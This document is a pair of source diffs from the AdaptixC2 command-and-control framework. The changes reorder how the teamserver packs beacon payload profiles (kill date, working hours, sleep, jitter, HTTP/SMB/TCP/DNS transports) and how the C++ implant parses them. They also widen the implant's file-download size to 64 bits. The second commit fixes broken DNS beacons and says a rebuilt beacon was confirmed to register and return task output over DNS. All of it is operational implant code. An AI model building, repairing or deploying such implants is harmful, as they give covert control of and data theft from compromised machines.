Adaptix-Framework/AdaptixC2

commit 04de9a5b87e3e9d5de78a085460b6f3eb0ae5da5

beacon download fix

AdaptixServer/extenders/beacon_agent/pl_main.go
@@ -349,11 +349,25 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			}
 		}
 
+		sleepSeconds, err := parseDurationToSeconds(generateConfig.Sleep)
+		if err != nil {
+			return nil, err
+		}
+
+		lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
+
 		encrypt_key, _ := listenerMap["encrypt_key"].(string)
 		encryptKey, err := hex.DecodeString(encrypt_key)
 		if err != nil {
 			return nil, err
 		}
+
+		params = append(params, int(agentWatermark))
+		params = append(params, kill_date)
+		params = append(params, working_time)
+		params = append(params, sleepSeconds)
+		params = append(params, generateConfig.Jitter)
+		params = append(params, int(lWatermark))
 
 		protocol, _ := listenerMap["protocol"].(string)
 		switch protocol {
@@ -386,7 +400,6 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			RequestHeaders, _ := listenerMap["request_headers"].(string)
 			HostHeaderRaw, _ := listenerMap["host_header"].(string)
 
-			// Parse multi-value fields (newline-separated)
 			var Uris []string
 			for _, u := range strings.Split(UriRaw, "\n") {
 				u = strings.TrimSpace(u)
@@ -417,7 +430,6 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 				}
 			}
 
-			// Strip "Host: ...\r\n" from RequestHeaders (agent handles host header separately)
 			if len(HostHeaders) > 0 {
 				lines := strings.Split(RequestHeaders, "\r\n")
 				var filtered []string
@@ -438,12 +450,6 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 				rotationMode = 1
 			}
 
-			seconds, err := parseDurationToSeconds(generateConfig.Sleep)
-			if err != nil {
-				return nil, err
-			}
-
-			params = append(params, int(agentWatermark))
 			params = append(params, Ssl)
 			params = append(params, c2Count)
 			for i := 0; i < c2Count; i++ {
@@ -481,41 +487,27 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			params = append(params, generateConfig.ProxyPort)
 			params = append(params, generateConfig.ProxyUsername)
 			params = append(params, generateConfig.ProxyPassword)
-			params = append(params, kill_date)
-			params = append(params, working_time)
-			params = append(params, seconds)
-			params = append(params, generateConfig.Jitter)
 
 		case "bind_smb":
 
 			pipename, _ := listenerMap["pipename"].(string)
 			pipename = "\\\\.\\pipe\\" + pipename
 
-			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
-
-			params = append(params, int(agentWatermark))
 			params = append(params, pipename)
-			params = append(params, int(lWatermark))
-			params = append(params, kill_date)
 
 		case "bind_tcp":
 			prepend, _ := listenerMap["prepend_data"].(string)
 			port, _ := listenerMap["port_bind"].(float64)
 
-			lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
-
-			params = append(params, int(agentWatermark))
 			params = append(params, prepend)
 			params = append(params, int(port))
-			params = append(params, int(lWatermark))
-			params = append(params, kill_date)
 
 		case "dns":
 			userAgent := generateConfig.UserAgent
 			if userAgent == "" {
 				userAgent = "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0"
 			}
-			params, err = buildDNSProfileParams(generateConfig, listenerMap, transportProfile.Watermark, agentWatermark, kill_date, working_time, userAgent)
+			params, err = buildDNSProfileParams(generateConfig, listenerMap, userAgent)
 			if err != nil {
 				return nil, err
 			}

AdaptixServer/extenders/beacon_listener_dns/pl_main.go
@@ -8,7 +8,7 @@ import (
 	"strings"
 	"time"
 
-	adaptix "github.com/Adaptix-Framework/axc2"
+	"github.com/Adaptix-Framework/axc2"
 )
 
 type Teamserver interface {

AdaptixServer/extenders/beacon_agent/pl_utils.go
@@ -279,7 +279,7 @@ func formatBurstStatus(enabled int, sleepMs int, jitterPct int) string {
 	return fmt.Sprintf("on (sleep=%dms, jitter=%d%%)", sleepMs, jitterPct)
 }
 
-func buildDNSProfileParams(generateConfig GenerateConfig, listenerMap map[string]any, listenerWM string, agentWatermark int64, killDate int, workingTime int, userAgent string) ([]interface{}, error) {
+func buildDNSProfileParams(generateConfig GenerateConfig, listenerMap map[string]any, userAgent string) ([]interface{}, error) {
 
 	domain, _ := listenerMap["domain"].(string)
 
@@ -319,13 +319,6 @@ func buildDNSProfileParams(generateConfig GenerateConfig, listenerMap map[string
 		labelSize = dnsDefaultLabelSize
 	}
 
-	seconds, err := parseDurationToSeconds(generateConfig.Sleep)
-	if err != nil {
-		return nil, err
-	}
-
-	lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
-
 	burstEnabledF, _ := listenerMap["burst_enabled"].(bool)
 	burstSleepF, _ := listenerMap["burst_sleep"].(float64)
 	burstJitterF, _ := listenerMap["burst_jitter"].(float64)
@@ -344,8 +337,6 @@ func buildDNSProfileParams(generateConfig GenerateConfig, listenerMap map[string
 	}
 
 	params := []interface{}{
-		int(agentWatermark),
-		// ProfileDNS
 		domain,
 		resolvers,
 		dohResolvers,
@@ -358,11 +349,6 @@ func buildDNSProfileParams(generateConfig GenerateConfig, listenerMap map[string
 		burstJitter,
 		dnsMode, // DNS mode (0=UDP, 1=DoH, 2=UDP->DoH, 3=DoH->UDP)
 		userAgent,
-		int(lWatermark),
-		killDate,
-		workingTime,
-		seconds,
-		generateConfig.Jitter,
 	}
 
 	return params, nil

AdaptixServer/extenders/beacon_agent/src_beacon/beacon/Agent.cpp
@@ -17,31 +17,24 @@ void Agent::operator delete(void* p) noexcept
 
 Agent::Agent()
 {
-	info = new AgentInfo();
-	config = new AgentConfig();
-	commander = new Commander(this);
-	downloader = new Downloader(config->download_chunk_size);
-	jober = new JobsController();
+	info        = new AgentInfo();
+	config      = new AgentConfig();
+	commander   = new Commander(this);
+	downloader  = new Downloader(config->download_chunk_size);
+	jober       = new JobsController();
 	memorysaver = new MemorySaver();
-	proxyfire = new Proxyfire();
-	pivotter = new Pivotter();
+	proxyfire   = new Proxyfire();
+	pivotter    = new Pivotter();
 
 	SessionKey = (PBYTE) MemAllocLocal(16);
 	for (int i = 0; i < 16; i++)
 		SessionKey[i] = GenerateRandom32() % 0x100;
-
-	this->config->active = true;
-}
-
-void Agent::SetActive(BOOL state)
-{
-	this->config->active = state;
 }
 
 BOOL Agent::IsActive()
 {
 	ULONG now = GetSystemTimeAsUnixTimestamp();
-	return this->config->active && !(this->config->kill_date && now >= this->config->kill_date);
+	return this->Active && !(this->config->kill_date && now >= this->config->kill_date);
 }
 
 ULONG Agent::GetWorkingSleep() 

AdaptixServer/extenders/beacon_agent/src_beacon/beacon/Agent.h
@@ -29,10 +29,10 @@ public:
 	Map<CHAR*, LPVOID> Values;
 
 	BYTE* SessionKey = NULL;
+	BOOL  Active     = TRUE;
 
 	Agent();
 
-	void  SetActive(BOOL state);
 	BOOL  IsActive();
 	ULONG GetWorkingSleep();
 	BYTE* BuildBeat(ULONG* size);

AdaptixServer/extenders/beacon_agent/src_beacon/beacon/AgentConfig.cpp
@@ -30,26 +30,32 @@ AgentConfig::AgentConfig()
 
 	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
 	
-	this->agent_type = packer->Unpack32();
-	
+	this->agent_type   = packer->Unpack32();
+	this->kill_date    = packer->Unpack32();
+	this->working_time = packer->Unpack32();
+	this->sleep_delay  = packer->Unpack32();
+	this->jitter_delay = packer->Unpack32();
+
 #if defined(BEACON_HTTP)
-	this->profile.use_ssl       = packer->Unpack8();
-	this->profile.servers_count = packer->Unpack32();
-	this->profile.servers       = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
-	this->profile.ports         = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD) );
+	this->listener_type = packer->Unpack32();
+
+	this->profile.use_ssl        = packer->Unpack8();
+	this->profile.servers_count  = packer->Unpack32();
+	this->profile.servers        = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
+	this->profile.ports          = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD) );
 	for (int i = 0; i < this->profile.servers_count; i++) {
 		this->profile.servers[i] = packer->UnpackBytesCopy(&length);
 		this->profile.ports[i]   = (WORD) packer->Unpack32();
 	}
-	this->profile.http_method  = packer->UnpackBytesCopy(&length);
-	this->profile.uri_count    = packer->Unpack32();
-	this->profile.uris         = (BYTE**) MemAllocLocal(this->profile.uri_count * sizeof(LPVOID));
+	this->profile.http_method = packer->UnpackBytesCopy(&length);
+	this->profile.uri_count   = packer->Unpack32();
+	this->profile.uris        = (BYTE**)MemAllocLocal(this->profile.uri_count * sizeof(LPVOID));
 	for (ULONG i = 0; i < this->profile.uri_count; i++) {
 		this->profile.uris[i] = packer->UnpackBytesCopy(&length);
 	}
-	this->profile.parameter    = packer->UnpackBytesCopy(&length);
-	this->profile.ua_count     = packer->Unpack32();
-	this->profile.user_agents  = (BYTE**) MemAllocLocal(this->profile.ua_count * sizeof(LPVOID));
+	this->profile.parameter   = packer->UnpackBytesCopy(&length);
+	this->profile.ua_count    = packer->Unpack32();
+	this->profile.user_agents = (BYTE**)MemAllocLocal(this->profile.ua_count * sizeof(LPVOID));
 	for (ULONG i = 0; i < this->profile.ua_count; i++) {
 		this->profile.user_agents[i] = packer->UnpackBytesCopy(&length);
 	}
@@ -57,43 +63,28 @@ AgentConfig::AgentConfig()
 	this->profile.ans_pre_size = packer->Unpack32();
 	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;
 	this->profile.hh_count     = packer->Unpack32();
-	this->profile.host_headers = (BYTE**) MemAllocLocal(this->profile.hh_count * sizeof(LPVOID));
+	this->profile.host_headers = (BYTE**)MemAllocLocal(this->profile.hh_count * sizeof(LPVOID));
 	for (ULONG i = 0; i < this->profile.hh_count; i++) {
 		this->profile.host_headers[i] = packer->UnpackBytesCopy(&length);
 	}
-	this->profile.rotation_mode = (BYTE) packer->Unpack32();
-
+	this->profile.rotation_mode  = (BYTE) packer->Unpack32();
 	this->profile.proxy_type     = (BYTE) packer->Unpack32();
 	this->profile.proxy_host     = packer->UnpackBytesCopy(&length);
 	this->profile.proxy_port     = (WORD) packer->Unpack32();
 	this->profile.proxy_username = packer->UnpackBytesCopy(&length);
 	this->profile.proxy_password = packer->UnpackBytesCopy(&length);
 
-	this->listener_type = 0;
-
-	this->kill_date    = packer->Unpack32();
-	this->working_time = packer->Unpack32();
-	this->sleep_delay  = packer->Unpack32();
-	this->jitter_delay = packer->Unpack32();
-
 #elif defined(BEACON_SMB)
-	this->profile.pipename = packer->UnpackBytesCopy(&length);
 	this->listener_type    = packer->Unpack32();
-	this->kill_date        = packer->Unpack32();
-	this->working_time     = 0;
-	this->sleep_delay      = 0;
-	this->jitter_delay     = 0;
+	this->profile.pipename = packer->UnpackBytesCopy(&length);
 
 #elif defined(BEACON_TCP)
+	this->listener_type   = packer->Unpack32();
 	this->profile.prepend = packer->UnpackBytesCopy(&length);
 	this->profile.port    = packer->Unpack32();
-	this->listener_type   = packer->Unpack32();
-	this->kill_date       = packer->Unpack32();
-	this->working_time    = 0;
-	this->sleep_delay     = 0;
-	this->jitter_delay    = 0;
 
 #elif defined(BEACON_DNS)
+	this->listener_type         = packer->Unpack32();
 	this->profile.domain        = packer->UnpackBytesCopy(&length);
 	this->profile.resolvers     = packer->UnpackBytesCopy(&length);
 	this->profile.doh_resolvers = packer->UnpackBytesCopy(&length);
@@ -107,13 +98,6 @@ AgentConfig::AgentConfig()
 	this->profile.burst_jitter  = packer->Unpack32();
 	this->profile.dns_mode      = packer->Unpack32();
 	this->profile.user_agent    = packer->UnpackBytesCopy(&length);
-
-	this->listener_type = packer->Unpack32();
-	this->kill_date     = packer->Unpack32();
-	this->working_time  = packer->Unpack32();
-	this->sleep_delay   = packer->Unpack32();
-	this->jitter_delay  = packer->Unpack32();
-
 #endif
 
 #if defined(BEACON_DNS)

AdaptixServer/extenders/beacon_agent/src_beacon/beacon/AgentConfig.h
@@ -71,8 +71,6 @@ typedef struct {
 class AgentConfig
 {
 public:
-	BOOL active;
-
 	ULONG agent_type;
 	ULONG listener_type;
 	BYTE* encrypt_key;

AdaptixServer/extenders/beacon_agent/src_beacon/beacon/Commander.cpp
@@ -283,14 +283,16 @@ void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker
 	else {
 		CHAR  fullPath[MAX_PATH];
 		DWORD pathSize = ApiWin->GetFullPathNameA( filename, MAX_PATH, fullPath, NULL);
-		DWORD fileSize = ApiWin->GetFileSize( hFile, 0 );
+		DWORD fileSizeHigh = 0;
+		DWORD fileSizeLow  = ApiWin->GetFileSize( hFile, &fileSizeHigh );
+		ULONG64 fileSize   = ((ULONG64)fileSizeHigh << 32) | fileSizeLow;
 
 		if (pathSize > 0) {
 			DownloadData downloadData = this->agent->downloader->CreateDownloadData(taskId, hFile, fileSize);
 			outPacker->Pack32(COMMAND_DOWNLOAD);
 			outPacker->Pack32(downloadData.fileId);
 			outPacker->Pack8(DOWNLOAD_START);
-			outPacker->Pack32(downloadData.fileSize);
+			outPacker->Pack64(downloadData.fileSize);
 			outPacker->PackBytes((PBYTE)fullPath, pathSize);
 		}
 		else {
@@ -1048,7 +1050,7 @@ void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacke
 {
 	agent->config->exit_method  = inPacker->Unpack32();
 	agent->config->exit_task_id = inPacker->Unpack32();
-	agent->SetActive(FALSE);
+	agent->Active = FALSE;
 }
 
 void Commander::CmdTunnelMsgConnectTCP(ULONG commandId, Packer* inPacker, Packer* outPacker) 

commit 08f7cce182a4ba37901855328ed7fd9fc13070d0

fix(beacon_agent): append DNS profile params instead of replacing them
buildDNSProfileParams() returns only the 12 DNS-specific fields, but the
call site assigned the result to `params`, discarding the six common
fields appended just above it (agent watermark, kill_date, working_time,
sleep, jitter, listener watermark).

AgentConfig::AgentConfig() parses those six fields first for every beacon
type, plus listener_type in the BEACON_DNS branch, before `domain`. A DNS
payload generated by this build therefore hands the beacon a 24-byte
shifted profile: `domain` is decoded from a bogus length, ends up empty,
ConnectorDNS::Init() fails and the beacon sends no traffic at all.

Regression from 04de9a5b ("beacon download fix"), which reordered the
config layout and dropped the prefix arguments from buildDNSProfileParams()
but left the DNS call site as a plain assignment.

Verified: a BeaconDNS payload's embedded profile is now 259 bytes (was
235), parses back with the exact field order of AgentConfig.cpp consuming
all 259 bytes with no remainder, and a beacon built from it registers on
the teamserver and returns task output over DNS.

AdaptixServer/extenders/beacon_agent/pl_main.go
@@ -490,10 +490,11 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			if userAgent == "" {
 				userAgent = "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0"
 			}
-			params, err = buildDNSProfileParams(generateConfig, listenerMap, userAgent)
+			dnsParams, err := buildDNSProfileParams(generateConfig, listenerMap, userAgent)
 			if err != nil {
 				return nil, err
 			}
+			params = append(params, dnsParams...)
 
 		default:
 			return nil, errors.New("protocol unknown")